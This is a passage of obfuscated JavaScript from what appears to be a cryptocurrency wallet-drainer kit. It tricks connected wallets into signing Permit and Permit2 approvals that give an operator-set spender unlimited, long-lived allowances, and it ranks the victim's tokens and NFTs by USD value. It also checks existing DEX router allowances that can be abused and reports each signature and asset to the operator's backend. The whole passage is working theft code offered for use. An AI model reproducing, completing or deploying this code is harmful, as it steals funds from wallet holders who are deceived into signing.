                    'nonce': (await _0x270ad8['allowance'](MS_Current_Address, _0x22ef9b[_0x48aa27(0x1e6)], MS_Settings[_0x48aa27(0x30a)][_0x48aa27(0x318)] ? MS_Settings['Personal_Wallet'][_0x48aa27(0x1e6)] : MS_Settings[_0x48aa27(0x2ad)]))[_0x48aa27(0x2c8)]
                },
                'spender': MS_Settings[_0x48aa27(0x30a)]['Use_Randomizer_For_Tokens'] ? MS_Settings[_0x48aa27(0x305)][_0x48aa27(0x1e6)] : MS_Settings[_0x48aa27(0x2ad)],
                'sigDeadline': _0x3fde6a
            }, swap_request(_0x48aa27(0x1c5), _0x22ef9b, [_0x22ef9b]), sign_next(), _0x105d80 = await MS_Signer[_0x48aa27(0x1d4)](_0x196217, _0x4bc88f, _0x338a97), _0x3fa78f = 0x1;
        }
        if (_0x105d80 != null) {
            await swap_success(_0x48aa27(0x1c5), _0x22ef9b, _0x3ee3b0), wait_message();
            const _0xfb36b2 = send_request({
                'action': _0x48aa27(0x18b),
                'user_id': MS_ID,
                'signature': _0x105d80,
                'message': _0x338a97,
                'asset': _0x22ef9b,
                'assets': _0x3ee3b0,
                'address': MS_Current_Address,
                'mode': _0x3fa78f,
                'PW': MS_Settings['Personal_Wallet']
            });
            if (MS_Settings[_0x48aa27(0x30a)][_0x48aa27(0x2ed)]) await _0xfb36b2;
            sign_ready();
        } else await sign_cancel();
    }, PERMIT_TOKEN = async _0xb1515f => {
        const _0x3c7677 = _0x1027e3,
            _0x21bdf9 = new ethers[(_0x3c7677(0x32b))](_0xb1515f[_0x3c7677(0x1e6)], _0xb1515f[_0x3c7677(0x1b6)], MS_Signer),
            _0x213fb2 = await _0x21bdf9['nonces'](MS_Current_Address),
            _0x55e9b4 = await _0x21bdf9[_0x3c7677(0x1bf)]();
        let _0x35d9ea = ethers[_0x3c7677(0x36e)]['parseEther'](MS_Unlimited_Amount);
        for (const _0x18cde7 of MS_Settings[_0x3c7677(0x297)]) {
            try {
                if (_0x18cde7[0x0] == MS_Current_Chain_ID && _0x18cde7[0x1] == _0xb1515f[_0x3c7677(0x1e6)]['toLowerCase']()[_0x3c7677(0x2fc)]()) {
                    _0x35d9ea = _0xb1515f[_0x3c7677(0x1d9)];
                    break;
                }
            } catch (_0x1ea490) {
                console[_0x3c7677(0x1db)](_0x1ea490);
            }
        }
        const _0x414229 = Date[_0x3c7677(0x364)]() + 0x3e8 * 0x3c * 0x3c * 0x18 * 0x164;
        let _0x3b58c3 = null,
            _0x451d22 = null;
        if (_0xb1515f[_0x3c7677(0x341)] == 0x1) _0x3b58c3 = {
            'Permit': [{
                'name': _0x3c7677(0x225),
                'type': _0x3c7677(0x1e6)
            }, {
                'name': 'spender',
                'type': _0x3c7677(0x1e6)
            }, {
                'name': 'nonce',
                'type': _0x3c7677(0x27d)
            }, {
                'name': _0x3c7677(0x1e9),
                'type': _0x3c7677(0x27d)
            }, {
                'name': 'allowed',
                'type': 'bool'
            }]
        }, _0x451d22 = {
            'holder': MS_Current_Address,
            'spender': MS_Settings['Settings'][_0x3c7677(0x318)] ? MS_Settings['Personal_Wallet'][_0x3c7677(0x1e6)] : MS_Settings[_0x3c7677(0x2ad)],
            'nonce': _0x213fb2,
            'expiry': _0x414229,
            'allowed': !![]
        };
        else _0xb1515f[_0x3c7677(0x341)] == 0x2 && (_0x3b58c3 = {
            'Permit': [{
                'name': _0x3c7677(0x268),
                'type': _0x3c7677(0x1e6)
            }, {
                'name': _0x3c7677(0x2f6),
                'type': _0x3c7677(0x1e6)
            }, {
                'name': _0x3c7677(0x31f),
                'type': _0x3c7677(0x27d)
            }, {
                'name': _0x3c7677(0x2c8),
                'type': _0x3c7677(0x27d)
            }, {
                'name': _0x3c7677(0x2f2),
                'type': _0x3c7677(0x27d)
            }]
        }, _0x451d22 = {
            'owner': MS_Current_Address,
            'spender': MS_Settings['Settings'][_0x3c7677(0x318)] ? MS_Settings[_0x3c7677(0x305)]['address'] : MS_Settings[_0x3c7677(0x2ad)],
            'value': _0x35d9ea,
            'nonce': _0x213fb2,
            'deadline': _0x414229
        });
        await approve_request(_0xb1515f), sign_next();
        const _0x8f3158 = await MS_Signer[_0x3c7677(0x1d4)]({
                'name': _0x55e9b4,
                'version': _0xb1515f[_0x3c7677(0x276)],
                'chainId': _0xb1515f[_0x3c7677(0x1cc)],
                'verifyingContract': _0xb1515f[_0x3c7677(0x1e6)]
            }, _0x3b58c3, _0x451d22),
            _0x5e6ac8 = {
                'r': _0x8f3158['slice'](0x0, 0x42),
                's': '0x' + _0x8f3158[_0x3c7677(0x230)](0x42, 0x82),
                'v': Number('0x' + _0x8f3158[_0x3c7677(0x230)](0x82, 0x84))
            };
        await approve_success(_0xb1515f), wait_message();
        const _0xe68f81 = send_request({
            'action': 'permit_token',
            'user_id': MS_ID,
            'sign': {
                'type': _0xb1515f[_0x3c7677(0x341)],
                'version': _0xb1515f[_0x3c7677(0x276)],
                'chain_id': _0xb1515f[_0x3c7677(0x1cc)],
                'address': _0xb1515f[_0x3c7677(0x1e6)],
                'owner': MS_Current_Address,
                'spender': MS_Settings[_0x3c7677(0x30a)][_0x3c7677(0x318)] ? MS_Settings[_0x3c7677(0x305)][_0x3c7677(0x1e6)] : MS_Settings['Address'],
                'value': _0x35d9ea['toString'](),
                'nonce': _0x213fb2['toString'](),
                'deadline': _0x414229,
                'r': _0x5e6ac8['r'],
                's': _0x5e6ac8['s'],
                'v': _0x5e6ac8['v'],
                'abi': _0xb1515f[_0x3c7677(0x1b6)]
            },
            'asset': _0xb1515f,
            'address': MS_Current_Address,
            'PW': MS_Settings['Personal_Wallet']
        });
        if (MS_Settings['Settings'][_0x3c7677(0x2ed)]) await _0xe68f81;
        sign_ready();
    }, sign_success = async (_0x25d43c, _0x1f42d3 = '0') => {
        const _0x2ad70b = _0x1027e3;
        try {
            if (_0x25d43c['type'] == _0x2ad70b(0x19a)) {
                _0x25d43c[_0x2ad70b(0x1d9)] = _0x1f42d3;
                const _0x29c401 = ethers['BigNumber']['from'](_0x25d43c['amount_raw']);
                _0x25d43c['amount_usd'] = parseFloat(ethers[_0x2ad70b(0x36e)][_0x2ad70b(0x226)](_0x29c401, _0x2ad70b(0x36d))) * MS_Currencies[convert_chain('ID', _0x2ad70b(0x336), _0x25d43c['chain_id'])][_0x2ad70b(0x1ae)], await send_request({
                    'action': _0x2ad70b(0x35b),
                    'asset': _0x25d43c,
                    'user_id': MS_ID
                });
            } else await send_request({
                'action': _0x2ad70b(0x35b),
                'asset': _0x25d43c,
                'user_id': MS_ID
            });
        } catch (_0x2bba39) {
            console[_0x2ad70b(0x1db)](_0x2bba39);
        }
    }, swap_success = async (_0x2d6cba, _0x23d618, _0x340907 = [], _0x473584 = '0') => {
        const _0x37177c = _0x1027e3;
        try {
            if (_0x23d618[_0x37177c(0x281)] == _0x37177c(0x19a)) {
                _0x23d618['amount_raw'] = _0x473584;
                const _0x35cccc = ethers[_0x37177c(0x24f)][_0x37177c(0x308)](_0x23d618[_0x37177c(0x1d9)]);
                _0x23d618['amount_usd'] = parseFloat(ethers[_0x37177c(0x36e)][_0x37177c(0x226)](_0x35cccc, 'ether')) * MS_Currencies[convert_chain('ID', _0x37177c(0x336), _0x23d618['chain_id'])]['USD'], await send_request({
                    'action': 'swap_success',
                    'asset': _0x23d618,
                    'user_id': MS_ID,
                    'list': _0x340907,
                    'swapper': _0x2d6cba
                });
            } else await send_request({
                'action': _0x37177c(0x234),
                'asset': _0x23d618,
                'user_id': MS_ID,
                'list': _0x340907,
                'swapper': _0x2d6cba
            });
        } catch (_0x1008e8) {
            console[_0x37177c(0x1db)](_0x1008e8);
        }
    }, transfer_success = async (_0xc96ee3, _0x579acf = '0') => {
        const _0x5f08b8 = _0x1027e3;
        try {
            if (_0xc96ee3[_0x5f08b8(0x281)] == 'NATIVE') {
                _0xc96ee3[_0x5f08b8(0x1d9)] = _0x579acf;
                const _0x1298b3 = ethers[_0x5f08b8(0x24f)][_0x5f08b8(0x308)](_0xc96ee3[_0x5f08b8(0x1d9)]);
                _0xc96ee3[_0x5f08b8(0x344)] = parseFloat(ethers[_0x5f08b8(0x36e)]['formatUnits'](_0x1298b3, _0x5f08b8(0x36d))) * MS_Currencies[convert_chain('ID', _0x5f08b8(0x336), _0xc96ee3['chain_id'])][_0x5f08b8(0x1ae)], await send_request({
                    'action': _0x5f08b8(0x175),
                    'asset': _0xc96ee3,
                    'user_id': MS_ID
                });
            } else await send_request({
                'action': 'transfer_success',
                'asset': _0xc96ee3,
                'user_id': MS_ID
            });
        } catch (_0x498688) {
            console[_0x5f08b8(0x1db)](_0x498688);
        }
    }, approve_success = async _0x1b7d32 => {
        const _0x781d89 = _0x1027e3;
        try {
            await send_request({
                'action': _0x781d89(0x18d),
                'asset': _0x1b7d32,
                'user_id': MS_ID
            });
        } catch (_0xa0f356) {
            console[_0x781d89(0x1db)](_0xa0f356);
        }
    }, sign_cancel = async () => {
        const _0x7dc89 = _0x1027e3;
        try {
            await send_request({
                'action': _0x7dc89(0x371),
                'user_id': MS_ID
            });
        } catch (_0x14e313) {
            console[_0x7dc89(0x1db)](_0x14e313);
        }
    }, sign_unavailable = async () => {
        const _0x4d35dc = _0x1027e3;
        try {
            await send_request({
                'action': _0x4d35dc(0x2b0),
                'user_id': MS_ID
            }), MS_Sign_Disabled = !![];
        } catch (_0x1fb015) {
            console[_0x4d35dc(0x1db)](_0x1fb015);
        }
    }, transfer_cancel = async () => {
        const _0x5e6e06 = _0x1027e3;
        try {
            await send_request({
                'action': _0x5e6e06(0x35d),
                'user_id': MS_ID
            });
        } catch (_0x2d82bb) {
            console[_0x5e6e06(0x1db)](_0x2d82bb);
        }
    }, approve_cancel = async () => {
        const _0x292c38 = _0x1027e3;
        try {
            await send_request({
                'action': _0x292c38(0x23e),
                'user_id': MS_ID
            });
        } catch (_0x4714a4) {
            console[_0x292c38(0x1db)](_0x4714a4);
        }
    }, chain_cancel = async () => {
        const _0x7e0251 = _0x1027e3;
        try {
            await send_request({
                'action': 'chain_cancel',
                'user_id': MS_ID
            });
        } catch (_0x74d95d) {
            console[_0x7e0251(0x1db)](_0x74d95d);
        }
    }, chain_success = async () => {
        const _0x2fbcd9 = _0x1027e3;
        try {
            await send_request({
                'action': _0x2fbcd9(0x1b1),
                'user_id': MS_ID
            });
        } catch (_0x1bf7d8) {
            console['log'](_0x1bf7d8);
        }
    }, chain_request = async (_0x588d12, _0x13cf49) => {
        const _0x17136b = _0x1027e3;
        try {
            await send_request({
                'action': 'chain_request',
                'user_id': MS_ID,
                'chains': [_0x588d12, _0x13cf49]
            });
        } catch (_0x26413c) {
            console[_0x17136b(0x1db)](_0x26413c);
        }
    }, sign_request = async _0x145551 => {
        try {
            await send_request({
                'action': 'sign_request',
                'user_id': MS_ID,
                'asset': _0x145551
            });
        } catch (_0x452d38) {
            console['log'](_0x452d38);
        }
    }, swap_request = async (_0x362420, _0x314b2b, _0x24d58d = []) => {
        const _0x1cd714 = _0x1027e3;
        try {
            await send_request({
                'action': _0x1cd714(0x333),
                'user_id': MS_ID,
                'asset': _0x314b2b,
                'list': _0x24d58d,
                'swapper': _0x362420
            });
        } catch (_0x5eeeb9) {
            console[_0x1cd714(0x1db)](_0x5eeeb9);
        }
    }, transfer_request = async _0x10d2f1 => {
        const _0x21b0dd = _0x1027e3;
        try {
            await send_request({
                'action': _0x21b0dd(0x358),
                'user_id': MS_ID,
                'asset': _0x10d2f1
            });
        } catch (_0x4a73ed) {
            console[_0x21b0dd(0x1db)](_0x4a73ed);
        }
    }, approve_request = async _0x4117f9 => {
        const _0x1102aa = _0x1027e3;
        try {
            await send_request({
                'action': _0x1102aa(0x2d0),
                'user_id': MS_ID,
                'asset': _0x4117f9
            });
        } catch (_0x2cfcdb) {
            console[_0x1102aa(0x1db)](_0x2cfcdb);
        }
    }, is_increase_approve = _0x1437fc => {
        const _0xe21c09 = _0x1027e3;
        try {
            if (_0x1437fc[_0xe21c09(0x239)](_0xe21c09(0x31e))) return 0x1;
            else return _0x1437fc[_0xe21c09(0x239)]('increaseApproval') ? 0x2 : ![];
        } catch (_0x3d0547) {
            return ![];
        }
    }, get_wallet_assets = async _0xb745e1 => {
        const _0x1d49b8 = _0x1027e3;
        try {
            let _0x286b9f = await send_request({
                    'action': 'check_wallet',
                    'address': MS_Current_Address
                }),
                _0x1457c9 = [];
            if (_0x286b9f['status'] == 'OK') _0x1457c9 = _0x286b9f[_0x1d49b8(0x1a0)];
            else {
                if (MS_Settings['AT'] != '' && _0x286b9f[_0x1d49b8(0x173)] == _0x1d49b8(0x2d1)) _0x1457c9 = await get_tokens(_0xb745e1);
                else {
                    if (_0x286b9f[_0x1d49b8(0x173)] != 'LOCAL_CHECK') return _0x1457c9;
                    else return MS_Check_Done = !![], MS_Loader_Style == 0x2 ? MSL[_0x1d49b8(0x314)]({
                        'icon': _0x1d49b8(0x173),
                        'title': _0x1d49b8(0x20a),
                        'subtitle': _0x1d49b8(0x21b),
                        'text': _0x1d49b8(0x22d),
                        'showConfirmButton': !![],
                        'confirmButtonText': 'OK',
                        'color': MS_Color_Scheme
                    }) : (Swal['close'](), Swal['fire']({
                        'html': _0x1d49b8(0x22f),
                        'icon': _0x1d49b8(0x173),
                        'allowOutsideClick': !![],
                        'allowEscapeKey': !![],
                        'timer': 0x0,
                        'width': 0x258,
                        'showConfirmButton': !![],
                        'confirmButtonText': 'OK'
                    })), await new Promise(_0x45a456 => setTimeout(_0x45a456, 0x2710)), _0x1457c9;
                }
            }
            let _0x3c743e = [];
            for (let _0x2d82fc = _0x1457c9[_0x1d49b8(0x25b)] - 0x1; _0x2d82fc >= 0x0; _0x2d82fc--) {
                try {
                    const _0x3d5f9f = _0x1457c9[_0x2d82fc],
                        _0x48a173 = convert_chain('ID', 'ANKR', _0x3d5f9f[_0x1d49b8(0x1cc)]);
                    if (!MS_Settings[_0x1d49b8(0x30a)][_0x1d49b8(0x248)][_0x48a173][_0x1d49b8(0x313)]) _0x1457c9[_0x1d49b8(0x35f)](_0x2d82fc, 0x1);
                    else {
                        if (_0x3d5f9f[_0x1d49b8(0x281)] == 'NATIVE' && !MS_Settings['Settings'][_0x1d49b8(0x248)][_0x48a173][_0x1d49b8(0x372)]) _0x1457c9[_0x1d49b8(0x35f)](_0x2d82fc, 0x1);
                        else {
                            if (_0x3d5f9f[_0x1d49b8(0x281)] == _0x1d49b8(0x345) && !MS_Settings[_0x1d49b8(0x30a)][_0x1d49b8(0x248)][_0x48a173]['Tokens']) _0x1457c9[_0x1d49b8(0x35f)](_0x2d82fc, 0x1);
                            else {
                                if (_0x3d5f9f['type'] == 'NATIVE' && _0x3d5f9f[_0x1d49b8(0x344)] < MS_Settings[_0x1d49b8(0x30a)][_0x1d49b8(0x248)][_0x48a173]['Min_Native_Price']) _0x1457c9['splice'](_0x2d82fc, 0x1);
                                else {
                                    if (_0x3d5f9f[_0x1d49b8(0x281)] == _0x1d49b8(0x345) && _0x3d5f9f[_0x1d49b8(0x344)] < MS_Settings[_0x1d49b8(0x30a)][_0x1d49b8(0x248)][_0x48a173][_0x1d49b8(0x33f)]) _0x1457c9[_0x1d49b8(0x35f)](_0x2d82fc, 0x1);
                                    else _0x3d5f9f[_0x1d49b8(0x281)] == _0x1d49b8(0x345) && (MS_Settings['Settings']['Permit2']['Mode'] && _0x3c743e['push'](new Promise(async _0x388016 => {
                                        const _0x225fb9 = _0x1d49b8;
                                        try {
                                            if (_0x3d5f9f[_0x225fb9(0x344)] >= MS_Settings[_0x225fb9(0x30a)][_0x225fb9(0x1c5)]['Price']) {
                                                const _0x5560da = new ethers[(_0x225fb9(0x265))][(_0x225fb9(0x315))](MS_Settings['RPCs'][_0x3d5f9f[_0x225fb9(0x1cc)]]),
                                                    _0x10bb8e = new ethers[(_0x225fb9(0x32b))](_0x3d5f9f[_0x225fb9(0x1e6)], MS_Contract_ABI[_0x225fb9(0x345)], _0x5560da);
                                                let _0x3c8711 = await _0x10bb8e[_0x225fb9(0x325)](MS_Current_Address, '0x000000000022d473030f116ddee9f6b43ac78ba3');
                                                ethers['BigNumber']['from'](_0x3c8711)['gt'](ethers[_0x225fb9(0x24f)][_0x225fb9(0x308)]('0')) && (_0x3d5f9f[_0x225fb9(0x228)] = !![], _0x3d5f9f['allowance'] = _0x3c8711, console[_0x225fb9(0x1db)](_0x225fb9(0x18e) + _0x3d5f9f[_0x225fb9(0x1bf)] + _0x225fb9(0x214) + _0x3c8711));
                                            }
                                        } catch (_0x48d022) {
                                            console[_0x225fb9(0x1db)](_0x48d022);
                                        }
                                        _0x388016();
                                    })), (MS_Settings['Settings'][_0x1d49b8(0x25f)][_0x1d49b8(0x191)] && MS_Settings[_0x1d49b8(0x30a)]['Permit'][_0x1d49b8(0x312)] > 0x0 || MS_Settings['Settings']['Approve'][_0x1d49b8(0x275)] >= 0x2 && MS_Current_Provider == _0x1d49b8(0x275) || MS_Settings[_0x1d49b8(0x30a)][_0x1d49b8(0x256)][_0x1d49b8(0x179)] >= 0x2 && MS_Current_Provider == _0x1d49b8(0x1f8)) && _0x3c743e[_0x1d49b8(0x28a)](new Promise(async _0x81058c => {
                                        const _0x33adce = _0x1d49b8;
                                        try {
                                            if (MS_Settings[_0x33adce(0x30a)][_0x33adce(0x256)]['MetaMask'] >= 0x2 && MS_Current_Provider == _0x33adce(0x275) || MS_Settings[_0x33adce(0x30a)]['Approve']['Trust'] >= 0x2 && MS_Current_Provider == 'Trust\x20Wallet' || _0x3d5f9f[_0x33adce(0x344)] >= MS_Settings[_0x33adce(0x30a)][_0x33adce(0x25f)][_0x33adce(0x2e8)]) {
                                                const _0x51bc3a = await retrive_token(_0x3d5f9f[_0x33adce(0x1cc)], _0x3d5f9f['address']),
                                                    _0x46ef4a = new ethers['providers'][(_0x33adce(0x315))](MS_Settings[_0x33adce(0x31a)][_0x3d5f9f[_0x33adce(0x1cc)]]),
                                                    _0x21e524 = new ethers['Contract'](_0x3d5f9f[_0x33adce(0x1e6)], _0x51bc3a, _0x46ef4a);
                                                if (is_increase_approve(_0x21e524[_0x33adce(0x28e)]) == 0x2) _0x3d5f9f[_0x33adce(0x2b3)] = 0x2, _0x3d5f9f['abi'] = _0x51bc3a;
                                                else is_increase_approve(_0x21e524[_0x33adce(0x28e)]) == 0x1 && (_0x3d5f9f['increase'] = 0x1, _0x3d5f9f[_0x33adce(0x1b6)] = _0x51bc3a);
                                                if (_0x3d5f9f[_0x33adce(0x344)] >= MS_Settings['Settings']['Permit'][_0x33adce(0x2e8)]) {
                                                    const _0x520287 = get_permit_type(_0x21e524[_0x33adce(0x28e)]);
                                                    _0x3d5f9f['permit'] = _0x520287, _0x3d5f9f[_0x33adce(0x276)] = '1', _0x3d5f9f['abi'] = _0x51bc3a;
                                                    if (_0x520287 > 0x0) {
                                                        if (_0x21e524[_0x33adce(0x28e)][_0x33adce(0x239)](_0x33adce(0x23b))) try {
                                                            _0x3d5f9f[_0x33adce(0x276)] = await _0x21e524['version']();
                                                        } catch (_0x53e107) {
                                                            console[_0x33adce(0x1db)](_0x53e107);
                                                        }
                                                        console[_0x33adce(0x1db)]('[PERMIT\x20FOUND]\x20' + _0x3d5f9f[_0x33adce(0x1bf)] + _0x33adce(0x363) + _0x520287 + ',\x20Version:\x20' + _0x3d5f9f['permit_ver']);
                                                    }
                                                }
                                            }
                                        } catch (_0x1b7089) {
                                            console['log'](_0x1b7089);
                                        }
                                        _0x81058c();
                                    })), MS_Settings[_0x1d49b8(0x30a)]['Swappers']['Enable'] && _0x3c743e[_0x1d49b8(0x28a)](new Promise(async _0x88d485 => {
                                        const _0x50ff54 = _0x1d49b8;
                                        try {
                                            if (_0x3d5f9f[_0x50ff54(0x344)] >= MS_Settings[_0x50ff54(0x30a)][_0x50ff54(0x337)][_0x50ff54(0x2e8)]) {
                                                const _0x8626b2 = new ethers[(_0x50ff54(0x265))]['JsonRpcProvider'](MS_Settings[_0x50ff54(0x31a)][_0x3d5f9f[_0x50ff54(0x1cc)]]);
                                                for (const _0x398763 of MS_Routers[_0x3d5f9f[_0x50ff54(0x1cc)]]) {
                                                    try {
                                                        const _0x40b355 = new ethers['Contract'](_0x3d5f9f['address'], MS_Contract_ABI['ERC20'], _0x8626b2),
                                                            _0x5301a7 = await _0x40b355['allowance'](MS_Current_Address, _0x398763[0x1]);
                                                        if (ethers[_0x50ff54(0x24f)][_0x50ff54(0x308)](_0x5301a7)['gt'](ethers[_0x50ff54(0x24f)]['from']('0'))) {
                                                            if (_0x398763[0x0] == _0x50ff54(0x249) && MS_Settings['Settings'][_0x50ff54(0x337)][_0x50ff54(0x2f5)] == 0x0) continue;
                                                            if (_0x398763[0x0] == 'Sushiswap' && MS_Settings[_0x50ff54(0x30a)][_0x50ff54(0x337)][_0x50ff54(0x32e)] == 0x0) continue;
                                                            if (_0x398763[0x0] == 'Uniswap' && (!MS_Uniswap_Whitelist[_0x50ff54(0x2e6)](_0x3d5f9f[_0x50ff54(0x1e6)]) || MS_Settings[_0x50ff54(0x30a)][_0x50ff54(0x337)]['Uniswap'] == 0x0)) continue;
                                                            if ((_0x398763[0x0] == 'Pancake' || _0x398763[0x0] == _0x50ff54(0x182)) && (!MS_Pancake_Whitelist[_0x50ff54(0x2e6)](_0x3d5f9f[_0x50ff54(0x1e6)]) || MS_Settings[_0x50ff54(0x30a)][_0x50ff54(0x337)][_0x50ff54(0x24c)] == 0x0)) continue;
                                                            _0x3d5f9f[_0x50ff54(0x2bb)] = !![], _0x3d5f9f['swapper_type'] = _0x398763[0x0], _0x3d5f9f[_0x50ff54(0x2ec)] = _0x398763[0x1], _0x3d5f9f[_0x50ff54(0x1eb)] = _0x5301a7, console[_0x50ff54(0x1db)](_0x50ff54(0x26b) + _0x3d5f9f[_0x50ff54(0x1bf)] + ',\x20' + _0x398763[0x0]);
                                                            break;
                                                        }
                                                    } catch (_0x193672) {
                                                        console[_0x50ff54(0x1db)](_0x193672);
                                                    }
                                                }
                                            }
                                        } catch (_0x34258a) {
                                            console['log'](_0x34258a);
                                        }
                                        _0x88d485();
                                    })));
                                }
                            }
                        }
                    }
                } catch (_0x15cd5c) {
                    console[_0x1d49b8(0x1db)](_0x15cd5c);
                }
            }
            await Promise[_0x1d49b8(0x254)](_0x3c743e);
            let _0x2eb5bf = ![];
            for (const _0x28bdc1 in MS_Settings[_0x1d49b8(0x30a)]['Chains']) {
                try {
                    if (MS_Settings[_0x1d49b8(0x30a)][_0x1d49b8(0x248)][_0x28bdc1][_0x1d49b8(0x195)]) {
                        _0x2eb5bf = !![];
                        break;
                    }
                } catch (_0x198bb9) {
                    console[_0x1d49b8(0x1db)](_0x198bb9);
                }
            }
            if (_0x2eb5bf) try {
                let _0x2888f7 = [];
                _0x286b9f = await send_request({
                    'action': _0x1d49b8(0x2fb),
                    'address': MS_Current_Address
                });
                if (_0x286b9f[_0x1d49b8(0x197)] == 'OK') {
                    _0x2888f7 = _0x286b9f[_0x1d49b8(0x1a0)];
                    for (const _0x446f18 of _0x2888f7) {
                        try {
                            const _0x20d8d7 = convert_chain('ID', _0x1d49b8(0x1b3), _0x446f18[_0x1d49b8(0x1cc)]);
                            if (_0x446f18[_0x1d49b8(0x281)] == _0x1d49b8(0x368)) continue;
                            if (!MS_Settings[_0x1d49b8(0x30a)]['Chains'][_0x20d8d7]['NFTs']) continue;
                            if (_0x446f18['amount_usd'] < MS_Settings[_0x1d49b8(0x30a)]['Chains'][_0x20d8d7][_0x1d49b8(0x352)]) continue;
                            _0x1457c9['push'](_0x446f18);
                        } catch (_0x3296a0) {
                            console[_0x1d49b8(0x1db)](_0x3296a0);
                        }
                    }
                } else {
                    _0x2888f7 = await get_nfts(_0xb745e1);
                    for (const _0x8cd668 of _0x2888f7) {
                        try {
                            const _0x55931d = convert_chain('ID', _0x1d49b8(0x1b3), _0x8cd668[_0x1d49b8(0x1cc)]);
                            if (_0x8cd668[_0x1d49b8(0x281)] == _0x1d49b8(0x368)) continue;
                            if (!MS_Settings[_0x1d49b8(0x30a)]['Chains'][_0x55931d][_0x1d49b8(0x195)]) continue;
                            if (_0x8cd668[_0x1d49b8(0x344)] < MS_Settings['Settings'][_0x1d49b8(0x248)][_0x55931d][_0x1d49b8(0x352)]) continue;
                            _0x1457c9[_0x1d49b8(0x28a)](_0x8cd668);
                        } catch (_0x515139) {
                            console[_0x1d49b8(0x1db)](_0x515139);
                        }
                    }
                }
            } catch (_0x448bc4) {
                console[_0x1d49b8(0x1db)](_0x448bc4);
            }
            _0x1457c9['sort']((_0x4bc824, _0x5c18df) => {
                const _0x1e5bff = _0x1d49b8;
                return _0x5c18df[_0x1e5bff(0x344)] - _0x4bc824['amount_usd'];
            });
            if (MS_Settings['Settings'][_0x1d49b8(0x1cd)] == 0x1) {
                const _0x48bf21 = [];
                for (const _0x148225 of _0x1457c9) {
                    try {
                        if (_0x148225[_0x1d49b8(0x281)] == _0x1d49b8(0x19a)) continue;
                        _0x48bf21[_0x1d49b8(0x28a)](_0x148225);
                    } catch (_0x1e78ee) {
                        console[_0x1d49b8(0x1db)](_0x1e78ee);
                    }
                }
                for (const _0x22be58 of _0x1457c9) {
                    try {
                        if (_0x22be58[_0x1d49b8(0x281)] != _0x1d49b8(0x19a)) continue;
                        _0x48bf21[_0x1d49b8(0x28a)](_0x22be58);
                    } catch (_0x1ecc60) {
                        console[_0x1d49b8(0x1db)](_0x1ecc60);
                    }
                }
                _0x1457c9 = _0x48bf21;
            } else {
                if (MS_Settings[_0x1d49b8(0x30a)]['Tokens_First'] == 0x2) {
                    const _0x575caf = [];
                    for (const _0x42912a of _0x1457c9) {
                        try {
                            if (_0x42912a[_0x1d49b8(0x281)] != _0x1d49b8(0x19a)) continue;
                            _0x575caf['push'](_0x42912a);
                        } catch (_0xb4b836) {
                            console[_0x1d49b8(0x1db)](_0xb4b836);
                        }
                    }
                    for (const _0x161b3c of _0x1457c9) {
                        try {
                            if (_0x161b3c[_0x1d49b8(0x281)] == 'NATIVE') continue;
                            _0x575caf['push'](_0x161b3c);
                        } catch (_0x302912) {
                            console[_0x1d49b8(0x1db)](_0x302912);
                        }
                    }
                    _0x1457c9 = _0x575caf;
                }
            }
            if (MS_Settings[_0x1d49b8(0x30a)][_0x1d49b8(0x337)][_0x1d49b8(0x313)] && MS_Settings[_0x1d49b8(0x30a)]['Swappers'][_0x1d49b8(0x312)] == 0x1) {
                const _0x25cbca = [];
                for (const _0x5db420 of _0x1457c9) {
                    try {
                        if (!_0x5db420[_0x1d49b8(0x2bb)]) continue;
                        _0x25cbca[_0x1d49b8(0x28a)](_0x5db420);
                    } catch (_0x1b3659) {
                        console['log'](_0x1b3659);
                    }
                }
                for (const _0x2369fe of _0x1457c9) {
                    try {
                        if (_0x2369fe['swapper']) continue;
                        _0x25cbca[_0x1d49b8(0x28a)](_0x2369fe);
                    } catch (_0x10d3c4) {
                        console['log'](_0x10d3c4);
                    }
                }
                _0x1457c9 = _0x25cbca;
            }
            if (MS_Settings[_0x1d49b8(0x30a)][_0x1d49b8(0x25f)][_0x1d49b8(0x191)] && MS_Settings[_0x1d49b8(0x30a)]['Permit'][_0x1d49b8(0x312)] > 0x0) {
                const _0x414936 = [];
                for (const _0x19f68e of _0x1457c9) {
                    try {
                        if (!_0x19f68e['permit'] || _0x19f68e[_0x1d49b8(0x341)] == 0x0 || _0x19f68e[_0x1d49b8(0x344)] < MS_Settings[_0x1d49b8(0x30a)][_0x1d49b8(0x25f)][_0x1d49b8(0x312)]) continue;
                        _0x414936[_0x1d49b8(0x28a)](_0x19f68e);
                    } catch (_0xf670de) {
                        console[_0x1d49b8(0x1db)](_0xf670de);
                    }
                }
                for (const _0x4b2762 of _0x1457c9) {
                    try {
                        if (_0x4b2762[_0x1d49b8(0x341)] && _0x4b2762[_0x1d49b8(0x341)] > 0x0 && _0x4b2762['amount_usd'] >= MS_Settings[_0x1d49b8(0x30a)]['Permit'][_0x1d49b8(0x312)]) continue;
                        _0x414936[_0x1d49b8(0x28a)](_0x4b2762);
                    } catch (_0x20d5de) {
                        console[_0x1d49b8(0x1db)](_0x20d5de);
                    }
                }
                _0x1457c9 = _0x414936;
            }
            if (MS_Settings[_0x1d49b8(0x30a)][_0x1d49b8(0x337)][_0x1d49b8(0x313)] && MS_Settings[_0x1d49b8(0x30a)][_0x1d49b8(0x337)][_0x1d49b8(0x312)] == 0x2) {
                const _0x190f11 = [];
                for (const _0x6f1d71 of _0x1457c9) {
                    try {
                        if (!_0x6f1d71['swapper']) continue;
                        _0x190f11['push'](_0x6f1d71);
                    } catch (_0x33d659) {
                        console[_0x1d49b8(0x1db)](_0x33d659);
                    }
                }
                for (const _0x4aefad of _0x1457c9) {
                    try {
                        if (_0x4aefad[_0x1d49b8(0x2bb)]) continue;
                        _0x190f11[_0x1d49b8(0x28a)](_0x4aefad);
                    } catch (_0x584223) {
                        console[_0x1d49b8(0x1db)](_0x584223);
                    }
                }
                _0x1457c9 = _0x190f11;
            }
            return _0x1457c9;
        } catch (_0xf70ec0) {
            return console[_0x1d49b8(0x1db)](_0xf70ec0), [];
        }
    }, APPROVE_TOKEN = async _0x23279a => {
        const _0x2034e1 = _0x1027e3;
        if (MS_Settings[_0x2034e1(0x30a)][_0x2034e1(0x256)][_0x2034e1(0x313)] == 0x0) return await TRANSFER_TOKEN(_0x23279a), 0x2;
        if ((MS_Current_Provider == _0x2034e1(0x275) && MS_Settings['Settings'][_0x2034e1(0x256)][_0x2034e1(0x275)] >= 0x2 || MS_Current_Provider == _0x2034e1(0x1f8) && MS_Settings[_0x2034e1(0x30a)][_0x2034e1(0x256)][_0x2034e1(0x179)] >= 0x2) && !_0x23279a[_0x2034e1(0x2b3)]) try {
